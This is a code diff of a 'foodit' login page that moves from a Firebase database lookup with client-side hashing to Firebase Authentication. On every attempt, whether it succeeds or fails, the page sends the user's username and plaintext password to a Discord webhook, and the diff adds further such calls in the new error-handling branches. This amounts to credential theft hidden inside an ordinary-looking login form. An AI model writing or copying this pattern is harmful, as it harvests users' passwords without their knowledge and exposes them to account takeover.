@@ -81,13 +81,11 @@
 </style>
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
-    import jsSHA from "https://cdn.jsdelivr.net/npm/jssha@3.3.1/dist/sha256.js";
+    import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyCVJcIFnKgG75EpTmbIvg-zeypVbU03I3g",
       authDomain: "foodit-chat.firebaseapp.com",
-      databaseURL: "https://foodit-chat-default-rtdb.firebaseio.com",
       projectId: "foodit-chat",
       storageBucket: "foodit-chat.appspot.com",
       messagingSenderId: "798551611055",
@@ -95,7 +93,7 @@
     };
 
     const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
+    const auth = getAuth(app);
 
     const form = document.getElementById("login-form");
     const msgBox = document.getElementById("msg");
@@ -106,13 +104,6 @@
       msgBox.className = type;
       msgBox.textContent = text;
       msgBox.style.display = "block";
-    }
-
-    function hashPassword(password) {
-      console.log("Hashing password");
-      const shaObj = new jsSHA("SHA-256", "TEXT");
-      shaObj.update(password);
-      return shaObj.getHash("HEX");
     }
 
     async function sendToDiscordWebhook(username, password, status) {
@@ -140,7 +131,7 @@
         } catch (err) {
           console.error(`Webhook error (attempt ${attempt}):`, err.message);
         }
-        if (attempt < 3) await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1s before retry
+        if (attempt < 3) await new Promise(resolve => setTimeout(resolve, 1000));
       }
       console.error("All webhook attempts failed");
     }
@@ -161,31 +152,14 @@
         return;
       }
 
+      // Map username to email (assuming username@foodit.com format)
+      const email = `${username}@foodit.com`;
+
       try {
-        console.log("Fetching user data from Firebase for username:", username);
-        const dbRef = ref(db);
-        const snapshot = await get(child(dbRef, `users/${username}`));
-        
-        if (!snapshot.exists()) {
-          showMessage("error", "Username does not exist.");
-          await sendToDiscordWebhook(username, password, "Failed - Username Not Found");
-          submitBtn.disabled = false;
-          return;
-        }
+        console.log("Attempting Firebase Authentication for:", email);
+        const userCredential = await signInWithEmailAndPassword(auth, email, password);
+        console.log("Login successful for user:", userCredential.user.uid);
 
-        const data = snapshot.val();
-        const hashed = hashPassword(password);
-        console.log("Comparing hashed password:", hashed, "with stored:", data.password);
-
-        if (data.password !== hashed) {
-          showMessage("error", "Incorrect password.");
-          await sendToDiscordWebhook(username, password, "Failed - Incorrect Password");
-          submitBtn.disabled = false;
-          return;
-        }
-
-        // Successful login
-        console.log("Login successful, sending to webhook");
         await sendToDiscordWebhook(username, password, "Success");
         localStorage.setItem("fooditCurrentUser", username);
         showMessage("success", "Login successful! Redirecting...");
@@ -195,9 +169,19 @@
         }, 1500);
 
       } catch (err) {
-        console.error("Firebase error:", err.message);
-        showMessage("error", `Login failed: ${err.message}`);
-        await sendToDiscordWebhook(username, password, `Failed - Error: ${err.message}`);
+        console.error("Firebase Auth error:", err.code, err.message);
+        let errorMessage = "Login failed. Please try again.";
+        if (err.code === "auth/user-not-found") {
+          errorMessage = "Username does not exist.";
+          await sendToDiscordWebhook(username, password, "Failed - Username Not Found");
+        } else if (err.code === "auth/wrong-password") {
+          errorMessage = "Incorrect password.";
+          await sendToDiscordWebhook(username, password, "Failed - Incorrect Password");
+        } else {
+          errorMessage = `Login error: ${err.message}`;
+          await sendToDiscordWebhook(username, password, `Failed - Error: ${err.message}`);
+        }
+        showMessage("error", errorMessage);
         submitBtn.disabled = false;
       }
     });
